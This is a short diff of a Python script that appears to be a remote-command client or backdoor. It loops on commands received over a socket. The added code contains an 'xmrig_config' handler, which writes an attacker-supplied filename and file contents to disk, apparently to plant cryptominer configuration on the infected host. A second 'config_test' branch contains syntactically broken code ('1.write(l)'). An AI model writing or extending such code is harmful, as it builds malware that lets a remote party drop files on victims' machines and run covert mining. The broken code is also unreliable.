@@ -94,12 +94,23 @@ while 1 :
        print("")
        print("command as been executed successfully")
     
-
-
-  
-       
-       
-      
-
     
-       
+    
+    elif command == "xmrig_config":
+        filename = s.recv(6000)
+        print(filename)
+        new_file = open(filename, "wb")
+        data = s.recv(6000)
+        print(data)
+        new_file.write(data)
+        new_file.close()
+    
+    
+    elif command == "config_test":
+        l = s.recv(1024)
+        
+        while (l):
+         1.write(l)
+         l = s.recv(1024)
+
+ 
